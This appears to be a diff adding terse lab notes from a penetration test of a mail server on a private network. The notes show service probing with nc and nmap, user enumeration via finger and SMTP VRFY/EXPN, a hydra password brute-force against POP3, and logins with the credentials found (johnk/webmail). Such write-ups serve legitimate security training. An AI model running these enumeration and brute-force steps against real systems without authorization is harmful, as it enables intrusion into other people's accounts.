@@ -1,0 +1,57 @@
+amap 192.168.1.202 110
+
+⚡nc 192.168.1.202 110
++OK mailserver01 Cyrus POP3 v2.3.2 server ready <3333065060.1488507494@mailserver01>
+USER guest
++OK Name is a valid mailbox
+PASS guest
+
+⚡ finger cyrus@192.168.1.202
+Login: cyrus          			Name: 
+Directory: /var/imap                	Shell: /bin/bash
+Never logged in.
+No mail.
+No Plan.
+
+⚡ finger root@192.168.1.202
+Login: root           			Name: root
+Directory: /root                    	Shell: /bin/bash
+
+⚡ nc 192.168.1.202 79
+0 1 2 3 4 5 6 7 8 9 
+
+root in ~/.user/write-ups/mailserver
+⚡ nmap --script=smtp* 192.168.1.202 -p 25 
+
+⚡ nc 192.168.1.202 25 
+220 localhost ESMTP Exim 4.68 Fri, 03 Mar 2017 03:07:50 +0000
+EHLO hacker
+250-localhost Hello hacker [192.168.1.201]
+250-SIZE 52428800
+250-EXPN
+250-PIPELINING
+250 HELP
+EXPN root
+VRFY guest
+VRFY root
+VRFY fakefake
+MAIL FROM: <root@mail.com>              
+RCPT TO: fakefake@localmail.com
+RCPT TO: fakefak@localhost
+RCPT TO: fake@gmail.com
+RCPT TO: johnk@mailserver01
+
+⚡ for name in `cat list.txt`; do for x in {a..z};do echo $name$x >> file.txt;done;done
+
+⚡ parallell.txt | parallel -j 10 finger {}@192.168.1.202 | grep -v "no such user."
+
+⚡ hydra -L usernames.txt -P weak_passwords.txt 192.168.1.202 pop3 
+
+⚡ nc 192.168.1.202 110
+USER johnk
+PASS webmail
+
+⚡ nc 192.168.1.202 143
+A0001 LOGIN johnk webmail 
+
+
